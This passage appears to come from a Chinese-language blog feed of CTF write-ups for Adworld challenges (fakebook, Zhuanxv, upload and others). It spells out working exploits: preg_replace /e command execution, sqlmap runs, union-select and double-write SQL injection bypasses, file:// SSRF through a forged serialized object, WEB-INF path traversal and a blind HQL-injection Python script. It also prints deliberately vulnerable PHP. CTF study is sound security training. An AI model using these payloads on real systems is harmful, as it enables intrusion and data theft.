&#39;区域&#39; &#125;,                     &#123; field: &#39;status&#39;, title: &#39;维护状态&#39;, minWidth: 120, sort: true &#125;,                     &#123; field: &#39;check&#39;, title: &#39;设备开关&#39;, width: 85, templet: &#39;#switchTpl&#39;, unresize: true &#125;                ]            ],            page: true        &#125;);    &#125;);    &lt;/script&gt;    &lt;script&gt;    layui.use(&#39;element&#39;, function() &#123;        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块        //监听导航点击        element.on(&#39;nav(demo)&#39;, function(elem) &#123;            //console.log(elem)            layer.msg(elem.text());        &#125;);    &#125;);    &lt;/script&gt;&lt;?php$page = $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt;    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;    &lt;div style=&quot;text-align:center&quot;&gt;        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;else&#123;?&gt;        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;        &lt;div style=&quot;text-align:center&quot;&gt;            &lt;p class=&quot;lead&quot;&gt;                &lt;?php                if (strpos($page, &#39;input&#39;) &gt; 0) &#123;                    die();                &#125;                if (strpos($page, &#39;ta:text&#39;) &gt; 0) &#123;                    die();                &#125;                if (strpos($page, &#39;text&#39;) &gt; 0) &#123;                    die();                &#125;                if ($page === &#39;index.php&#39;) &#123;                    die(&#39;Ok&#39;);                &#125;                    include($page);                    die();                ?&gt;        &lt;/p&gt;        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php&#125;&#125;//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;) &#123;//这里验证X-Forwarded-For头是不是127.0.0.1    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;    $pattern = $_GET[pat];    $replacement = $_GET[rep];    $subject = $_GET[sub];    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;        preg_replace($pattern, $replacement, $subject);    &#125;else&#123;        die();    &#125;&#125;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>首先进行X-Forwarded-For:127.0.0.1参数伪造</p><p>之后由于preg_replace()函数的&#x2F;e漏洞进行代码执行</p><p>这段 PHP 代码会获取 3 个变量：pat、rep 和 sub 的值，然后进入一个 if-else 语句。<strong>isset() 函数</strong>在 PHP 中用来判断变量是否声明，此处如果这 3 个值都有传递就会执行 **preg_replace()**函数。<br> preg_replace 函数执行一个正则表达式的搜索和替换，语法如下：</p><pre><code class="php">Copy mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></pre><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>$pattern</td><td>要搜索的模式，可以是字符串或一个字符串数组</td></tr><tr><td>$replacement</td><td>用于替换的字符串或字符串数组</td></tr><tr><td>$subject: 要搜索替换的目标字符串或字符串数组</td><td></td></tr><tr><td>$limit</td><td>可选，对于每个模式用于每个 subject 字符串的最大可替换次数。默认是 -1（无限制）</td></tr><tr><td>$count</td><td>可选，为替换执行的次数</td></tr><tr><td>如果 subject 是一个数组， preg_replace() 返回一个数组，其他情况下返回一个字符串。如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</td><td></td></tr><tr><td>这个函数有个 “&#x2F;e” 漏洞，“&#x2F;e” 修正符使 preg_replace() 将 replacement 参数当作 PHP  代码进行执行。如果这么做要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含  preg_replace() 的行中出现语法解析错误。</td><td></td></tr></tbody></table><pre><code>/index.php?pat=/abc/e&amp;rep=system(&#39;ls&#39;)&amp;sub=abc</code></pre><p>获得css index.html index.php js layui logo.png s3chahahaDir start.sh 视图.png</p><p>查看一下s3chahahaDir这个目录</p><pre><code>index.php?pat=/abc/e&amp;rep=system(&#39;ls%20s3chahahaDir&#39;)&amp;sub=abc</code></pre><p> 执行成功，发现 s3chahahaDir 下有个 flag 文件夹，那就更可疑了，再次执行 ls 命令在该文件中查看内容 </p><pre><code>index.php?pat=/abc/e&amp;rep=system(&#39;ls%20s3chahahaDir/flag&#39;)&amp;sub=abc</code></pre><p> 执行成功，发现 flag 文件夹下有一个 flag.php 文件，使用 cat 命令查看文件。查看之后打开 F12，即可看到 flag </p><pre><code>/index.php?pat=/abc/e&amp;rep=system(&#39;cat%20s3chahahaDir/flag/flag.php&#39;)&amp;sub=abc </code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界fakebook</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfakebook/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfakebook/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界fakebook"><a href="#攻防世界fakebook" class="headerlink" title="攻防世界fakebook"></a>攻防世界fakebook</h1><p>打开网页有login 与join界面login弱口令登录试试,登录使用sqlmap跑一下看有无注入</p><pre><code>python sqlmap.py -r C:\Users\14980\Desktop\text1.txt --level 4  --dbs --batch</code></pre><p>查看一下源码,在扫描一下目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101038987.png" alt="image-20220310103853926"></p><p>发现这些挨个访问看看在robots.txt页面发现有</p><pre><code class="txt">User-agent: *Disallow: /user.php.bak</code></pre><p>上面的文件虽然存在但是却无法访问到,有可能是因为权限不够,需要找系统中访问的其他方式</p><p>接下来下载下来user.php.bak得到源码</p><pre><code class="php">&lt;?php    class UserInfo&#123;    public $name = &quot;&quot;;   public $age = 0;   public $blog = &quot;&quot;;   public function __construct($name, $age, $blog)    &#123;     $this-&gt;name = $name;      $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    &#125;   function get($url)    &#123;        $ch = curl_init();//初始化一个url回话        curl_setopt($ch, CURLOPT_URL, $url);//设置需要抓取的url        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置url参数,要求结果保存到字符串还是输出到屏幕    $output = curl_exec($ch);//运行curl,请求网页     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);//获取一个curl连接资源句柄的信息      if($httpCode == 404) &#123;        return 404;        &#125;        curl_close($ch);//关闭一个curl会话     return $output;    &#125;   public function getBlogContents ()    &#123;     return $this-&gt;get($this-&gt;blog);    &#125;  public function isValidBlog ()    &#123;    $blog = $this-&gt;blog;      return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);    &#125;&#125;</code></pre><p>访问 view.php发现报错信息,得到绝对路径</p><pre><code> /var/www/html/view.php </code></pre><p>这里对join 注册页面进行抓包使用sqlmap抓包看看有无注入发现有一个注入点</p><pre><code>python sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -dbs --batch    //这里得到数据库名available databases [5]:[*] fakebook[*] information_schema[*] mysql[*] performance_schema[*] testpython sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -D fakebook --tables --batch   //这里得到表名userspython sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -D fakebook -T users --dump --batch    //这里得到字段-----------------------------------------------------------------+| no   | data | passwd    | username                                                 ---------------------------------------------+| 1    | O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:6:&quot;1.blog&quot;;&#125; | 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 (a) | admin   || 2    | O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:100:&quot;admin&#39; AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM fakebook.users),1,1))&gt;51-- yBdB&quot;;s:3:&quot;age&quot;;i:4;s:4:&quot;blog&quot;;s:6:&quot;1.blog&quot;;&#125; | 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 (a) | admin&#39; AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM fakebook.users),1,1))&gt;51-- yBdB |</code></pre><p>注册完成登录进去之后会发现只有一个username可以点击可以发现其在访问页面,在url中</p><pre><code>http://111.200.241.244:64253/view.php?no=1</code></pre><p>尝试一下sql注入发现报错信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101042353.png" alt="image-20220310104235297"></p><pre><code>http://111.200.241.244:64253/view.php?no=1 and 1=1#    正常http://111.200.241.244:64253/view.php?no=1 and 1=2#    错误</code></pre><p>可以发现有注入点,这里发现字段数为4</p><pre><code>view.php?no=1 order by 3#    错误view.php?no=1 order by 4#    正常view.php?no=1 order by 5#    错误</code></pre><p>在这里发现网页有对sql注入语句的过滤</p><pre><code>http://111.200.241.244:64253/view.php?no=-1 union select 1,2,3,4#</code></pre><p>这里经过fuzz发现单个的字符并未进行过滤而是过滤的union select整个语句所以这里使用注释符&#x2F;**&#x2F;进行绕过,或者++进行绕过</p><pre><code>http://111.200.241.244:64253/view.php?no=-1 union++select 1,2,3,4http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,2,3,4</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101043115.png" alt="image-20220310104318999"></p><p>这里发现2字段可以使用这里直接使用load_file()函数获取系统文件要求,权限较高,且要求文件的绝对路径,这里并没有</p><p>这里继续注入一下其他内容看看</p><pre><code>http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,user(),3,4//获得用户名root@localhost http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,database(),3,4//获得数据库名fakebook http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;#//获取fakebook中的表名usershttp://111.200.241.244:64253/view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;#//获取数据库名为fakebook,表名为users中的字段名no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,group_concat(data,username,passwd),3,4 from users where no=1#//获取数据库名为fakebook,表名为users中的字段名为data,username,passwd的值O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:38:&quot;https://zhuanlan.zhihu.com/p/161412754&quot;;&#125;a1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 </code></pre><p>这里的序列化对象便与之前的获得到的user.php.bak 进行了对应 这里便是进行反序列化了class UserInfo{}类</p><p>最开始时的用户页面no&#x3D;1时，页面返回用户的用户名、密码、博客之类的消息。毫无疑问，页面是根据users表中no&#x3D;1的这条数据，渲染的页面。因为回显，我们只证明了查询语句的第二个字段是username。其余三个字段并不明确，但我们可以猜测，应该和数据库表中的字段顺序相似。第四个字段应该就是data，而我们现在有一个现成的data数据，能否模拟下？</p><pre><code>http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:38:&quot;https://zhuanlan.zhihu.com/p/161412754&quot;;&#125;&#39;#</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101045078.png" alt="image-20220310104526968"></p><p>注意no现在的值为2，我们知道这个用户是不存在的。换而言之，原SQL语句的查询结果为空，而我们通过union加入了我们构造的查询语句，让SQL语句有了查询结果，并且此查询结果符合页面渲染要求，所以页面正常显示了。并且由此得知，只要有data字段的对象序列，就可以成功渲染页面，其他字段并不是很重要。（页面中age和blog的值，显然也都是从序列化的对象里面得到的）</p><p>因此这里需要构造blog参数的内容</p><pre><code>file:///var/www/html/flag.php</code></pre><p>原因是在源码中有blog的base64编码</p><pre><code class="html">   &lt;iframe width=&#39;100%&#39; height=&#39;10em&#39; src=&#39;data:text/html;base64,&#39;&gt;  </code></pre><p>这里利用了File协议读取本地文件,使用PHP构造出payload</p><pre><code class="php">&lt;?phpclass UserInfo&#123;    public $name = &quot;s&quot;;    public $age = 1;    public $blog = &quot;file:///var/www/html/flag.php&quot;;&#125;$a = new UserInfo();echo serialize($a);//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;s&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code></pre><p>接着进行访问</p><pre><code>http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;s&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;#</code></pre><p>得到base64加密文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101047862.png" alt="image-20220310104731820"></p><p>这里进行base64解密得到</p><pre><code class="php">&lt;?php$flag = &quot;flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;&quot;;exit(0);</code></pre><p>也可以直接点击链接</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203101047366.png" alt="image-20220310104743329"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界love_math</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Clove_math/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Clove_math/</url>
      
        <content type="html"><![CDATA[<h1 id="love-math攻防世界"><a href="#love-math攻防世界" class="headerlink" title="love_math攻防世界"></a>love_math攻防世界</h1><p>扫目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141115076.png" alt="image-20220314111502981"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141115588.png" alt="image-20220314111534555"></p><p>这题真简单..</p><p>打开网页得到源码</p><p>&#96;&#96;&#96;php<br>&lt;?php<br>error_reporting(0);<br>&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag<br>if(!isset($_GET[‘c’]))</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Zhuanxv</title>
      <link href="/java%E7%9F%A5%E8%AF%86/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/java-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CZhuanxv/"/>
      <url>/java%E7%9F%A5%E8%AF%86/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/java-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CZhuanxv/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界Zhuanxv"><a href="#攻防世界Zhuanxv" class="headerlink" title="攻防世界Zhuanxv"></a>攻防世界Zhuanxv</h1><h2 id="文件包含下载文件"><a href="#文件包含下载文件" class="headerlink" title="文件包含下载文件"></a>文件包含下载文件</h2><p><img src="https://s2.loli.net/2022/03/08/bvPVYlpLIC8Utoe.png" alt="image-20220308150856182"></p><p>打开之后可以发现一个时钟页面,这里边点点看,边扫一下目录</p><p><img src="https://s2.loli.net/2022/03/08/lvSGAZ1Fn3pQxsi.png" alt="image-20220308151039296"></p><p>挨个打开看看,发现在list下面有一个登录</p><p><img src="https://s2.loli.net/2022/03/08/jdhlzSLFcaoNQqb.png" alt="image-20220308151206877"></p><p>这里随便点点,抓包看着点</p><p><img src="https://s2.loli.net/2022/03/08/rePz9LG6lhAMb3N.png" alt="image-20220308151344673"></p><p>发现有jsession ,但是这里为什么就能确定是java写的呢</p><pre><code>Cookie“jsessionid是一个Cookie，可以通过在URL后面加上“;jsessionid=xxx”来传递“session id”；其中Servlet容器用来记录用户session，当我们创建回话时会自动创建，用来记录用户的访问记录。</code></pre><p>紧接着发现一个疑似文件包含的漏洞,一般考Java的题目都会想办法给出源码</p><p><img src="https://s2.loli.net/2022/03/08/NBLTvb4lKtO7GVj.png" alt="image-20220308151613489"></p><p>那么这里利用这个去尝试去读取..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml文件</p><pre><code>/loadimage?fileName=../../WEB-INF/web.xmlWEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：- `/WEB-INF/web.xml`：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。- `/WEB-INF/classes/`：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中- `/WEB-INF/lib/`：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件- `/WEB-INF/src/`：源码目录，按照包名结构放置各个java文件。- `/WEB-INF/database.properties`：数据库配置文件</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203081541285.png" alt="image-20220308152100940"></p><p>有一个struts2</p><pre><code>apps-存放了所有Struts2的示例项目docs-存放了所有Struts2与XWork的文档lib-存放了所有Struts2相关的JAR文件以及Struts2运行时所依赖的JAR文件src-存放了所有Struts2的源码，以Maven所指定的项目结构目录存放</code></pre><p>这里接着读取struts.xml</p><pre><code>/loadimage?fileName=../../WEB-INF/classes/struts.xml</code></pre><pre><code class="xml">HTTP/1.1 200 Content-Disposition: attachment;filename=&quot;bg.jpg&quot;Content-Type: image/jpegDate: Tue, 08 Mar 2022 07:45:12 GMTConnection: closeContent-Length: 2243&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE struts PUBLIC        &quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;        &quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;&gt;&lt;struts&gt;    &lt;constant name=&quot;strutsenableDynamicMethodInvocation&quot; value=&quot;false&quot;/&gt;    &lt;constant name=&quot;struts.mapper.alwaysSelectFullNamespace&quot; value=&quot;true&quot; /&gt;    &lt;constant name=&quot;struts.action.extension&quot; value=&quot;,&quot;/&gt;    &lt;package name=&quot;front&quot; namespace=&quot;/&quot; extends=&quot;struts-default&quot;&gt;        &lt;global-exception-mappings&gt;            &lt;exception-mapping exception=&quot;java.lang.Exception&quot; result=&quot;error&quot;/&gt;        &lt;/global-exception-mappings&gt;        &lt;action name=&quot;zhuanxvlogin&quot; class=&quot;com.cuitctf.action.UserLoginAction&quot; method=&quot;execute&quot;&gt;            &lt;result name=&quot;error&quot;&gt;/ctfpage/login.jsp&lt;/result&gt;            &lt;result name=&quot;success&quot;&gt;/ctfpage/welcome.jsp&lt;/result&gt;        &lt;/action&gt;        &lt;action name=&quot;loadimage&quot; class=&quot;com.cuitctf.action.DownloadAction&quot;&gt;            &lt;result name=&quot;success&quot; type=&quot;stream&quot;&gt;                &lt;param name=&quot;contentType&quot;&gt;image/jpeg&lt;/param&gt;                &lt;param name=&quot;contentDisposition&quot;&gt;attachment;filename=&quot;bg.jpg&quot;&lt;/param&gt;                &lt;param name=&quot;inputName&quot;&gt;downloadFile&lt;/param&gt;            &lt;/result&gt;            &lt;result name=&quot;suffix_error&quot;&gt;/ctfpage/welcome.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;    &lt;package name=&quot;back&quot; namespace=&quot;/&quot; extends=&quot;struts-default&quot;&gt;        &lt;interceptors&gt;            &lt;interceptor name=&quot;oa&quot; class=&quot;com.cuitctf.util.UserOAuth&quot;/&gt;            &lt;interceptor-stack name=&quot;userAuth&quot;&gt;                &lt;interceptor-ref name=&quot;defaultStack&quot; /&gt;                &lt;interceptor-ref name=&quot;oa&quot; /&gt;            &lt;/interceptor-stack&gt;        &lt;/interceptors&gt;        &lt;action name=&quot;list&quot; class=&quot;com.cuitctf.action.AdminAction&quot; method=&quot;execute&quot;&gt;            &lt;interceptor-ref name=&quot;userAuth&quot;&gt;                &lt;param name=&quot;excludeMethods&quot;&gt;                    execute                &lt;/param&gt;            &lt;/interceptor-ref&gt;            &lt;result name=&quot;login_error&quot;&gt;/ctfpage/login.jsp&lt;/result&gt;            &lt;result name=&quot;list_error&quot;&gt;/ctfpage/welcome.jsp&lt;/result&gt;            &lt;result name=&quot;success&quot;&gt;/ctfpage/welcome.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;</code></pre><p>这里有些class文件</p><pre><code class="xml">&lt;action name=&quot;zhuanxvlogin&quot; class=&quot;com.cuitctf.action.UserLoginAction&quot; method=&quot;execute&quot;&gt; &lt;action name=&quot;loadimage&quot; class=&quot;com.cuitctf.action.DownloadAction&quot;&gt;  &lt;interceptor name=&quot;oa&quot; class=&quot;com.cuitctf.util.UserOAuth&quot;/&gt;          &lt;action name=&quot;list&quot; class=&quot;com.cuitctf.action.AdminAction&quot; method=&quot;execute&quot;&gt;</code></pre><p>这里试着下载class文件试试,将.替换为&#x2F;再在末尾添加.class</p><pre><code>com/cuitctf/action/UserLoginAction.class</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203081553566.png" alt="image-20220308155313517"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203081556294.png" alt="image-20220308155624245"></p><p>接着使用idea反编译,得到登录源码,这里截取了部分有用的源码</p><pre><code class="java">    public boolean userCheck(User user) &#123;        List&lt;User&gt; userList = this.userService.loginCheck(user.getName(), user.getPassword());        if (userList != null &amp;&amp; userList.size() == 1) &#123;            return true;        &#125; else &#123;            this.addActionError(&quot;Username or password is Wrong, please check!&quot;);            return false;        &#125;    &#125;</code></pre><p>接着下载classes下面的applicationContext.xml文件</p><pre><code>applicationContext.xml</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203081608412.png" alt="image-20220308160811364"></p><pre><code>下载userserviceimpl.class</code></pre><pre><code class="java">    public List&lt;User&gt; loginCheck(String name, String password) &#123;        name = name.replaceAll(&quot; &quot;, &quot;&quot;);        name = name.replaceAll(&quot;=&quot;, &quot;&quot;);        Matcher username_matcher = Pattern.compile(&quot;^[0-9a-zA-Z]+$&quot;).matcher(name);        Matcher password_matcher = Pattern.compile(&quot;^[0-9a-zA-Z]+$&quot;).matcher(password);        return password_matcher.find() ? this.userDao.loginCheck(name, password) : null;    &#125;</code></pre><p>找到登录的规则</p><p>是登陆语句的过滤规则,在UserDaoImpl.class中找到:</p><pre><code class="java">    public List&lt;User&gt; loginCheck(String name, String password) &#123;        return this.getHibernateTemplate().find(&quot;from User where name =&#39;&quot; + name + &quot;&#39; and password = &#39;&quot; + password + &quot;&#39;&quot;);    &#125;</code></pre><p>python脚本</p><pre><code class="python">import requestss=requests.session()flag=&#39;&#39;for i in range(1,50):    p=&#39;&#39;    for j in range(1,255):        payload = &quot;(select%0Aascii(substr(id,&quot;+str(i)+&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&#39;&quot;+str(j)+&quot;&#39;&quot;        #print payload        url=&quot;http://111.200.241.244:62308/zhuanxvlogin?user.name=admin&#39;%0Aor%0A&quot;+payload+&quot;%0Aor%0Aname%0Alike%0A&#39;admin&amp;user.password=1&quot;        r1=s.get(url)        #print url        #print len(r1.text)        if len(r1.text)&gt;20000 and p!=&#39;&#39;:            flag+=p            print i,flag            break        p=chr(j)        #sctf&#123;C46E250926A2DFFD831975396222B08E&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> java知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界upload</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/sql-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/sql-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界upload"><a href="#攻防世界upload" class="headerlink" title="攻防世界upload"></a>攻防世界upload</h1><p>扫目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142147854.png" alt="image-20220314214713805"></p><p>有几个配置文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142147604.png" alt="image-20220314214755557"></p><p>里面也发现不了什么东西,只能回到register页面</p><p>注册一个登进去,发现是一个上传目录的地方</p><p>小传一个,回显名称,文件链接呢</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142152589.png" alt="image-20220314215208538"></p><p>说是注入漏洞,我们之间select database()发现只剩下databse() select被替换为了空,那么我们先fuzz一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142203298.png" alt="image-20220314220327233"></p><p>这里直接双写绕过过滤</p><p>猜测它直接将我们上传的文件存入了数据库<br>那可能通过文件进行sql注入？<br>类似insert into 表名(‘filename’,…) values(‘上传的文件名’,…);这样</p><p>构造’ select database() ‘.jpg上传<br>结果被过滤了</p><p>猜测是select或空格被过滤<br>都改掉：双写select，空格用“+”<br>构造’+(selselectect database())+’.jpg<br>返回0<br><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142215072.png" alt="image-20220314221515010"></p><pre><code>CONV()：进制的转换</code></pre><pre><code>CONV(N,from_base,to_base)select conv(16,10,16);+—————-+| conv(16,10,16) |+—————-+| 10 |+—————-+1 row in set (0.04 sec)</code></pre><pre><code>N是要转换的数据，from_base是原进制，to_base是目标进制如果N是有符号数字，则to_base要以负数的形式提供，否则会将N当作无符号数mysql&gt; select conv(-16,10,16);+——————+| conv(-16,10,16) |+——————+| FFFFFFFFFFFFFFF0 |+——————+1 row in set (0.00 sec)mysql&gt; select conv(-16,10,-16);+——————+| conv(-16,10,-16) |+——————+| -10 |+——————+1 row in set (0.00 sec)</code></pre><pre><code>substr（）：搜索字符串substr(string string,num start,num length);string为字符串，start为起始位置，length为长度。mysql中的start是从1开始的，而hibernate中的start是从0开始的。</code></pre><p>所以构造</p><pre><code>&#39;+(selecselectt substr(database(),1,12))+&#39;</code></pre><p>又返回一个0</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142219737.png" alt="image-20220314221936675"></p><p>这里将database进行16进制转码</p><pre><code>&#39;+(selecselectt substr(hex(database()),1,12))+&#39;</code></pre><p>返回了一个7765625</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142222869.png" alt="image-20220314222207808"></p><p>但是当进行16进制转字符串时却发现,并不是完整数据</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142223283.png" alt="image-20220314222322257"></p><p>说明有截断</p><p>那么就使用conv将16进制转换为10进制</p><pre><code>&#39;+(selecselectt conv(substr(hex(database()),1,12),16,10))+&#39;</code></pre><p>至于这里为什么要截取呢那是因为13太长了转换成十进制会造成科学计数法</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142229598.png" alt="image-20220314222928570"></p><pre><code class="mysql">&#39;+(selecselectt conv(substr(hex(database()),1,12),16,10))+&#39;#web_up&#39;+(selecselectt conv(substr(hex(database()),13,12),16,10))+&#39;#loaddatabase:web_upload</code></pre><p>接着注入表的时候发现from被过滤了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203142235210.png" alt="image-20220314223529159"></p><p>再次双写绕过</p><pre><code class="mysql">&#39;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#39;web_upload&#39;)),1,12),16,10))+&#39;#files,&#39;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#39;web_upload&#39;)),13,12),16,10))+&#39;#hello_&#39;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#39;web_upload&#39;)),25,12),16,10))+&#39;#flag_i&#39;+(selecselectt conv(substr(hex((selecselectt group_concat(table_name) frfromom information_schema.tables where table_schema=&#39;web_upload&#39;)),37,12),16,10))+&#39;#s_here#hello_flag_is_here</code></pre><p>得到字段名</p><pre><code class="mysql">&#39;+(selecselectt conv(substr(hex((selecselectt group_concat(column_name) frfromom information_schema.columns where 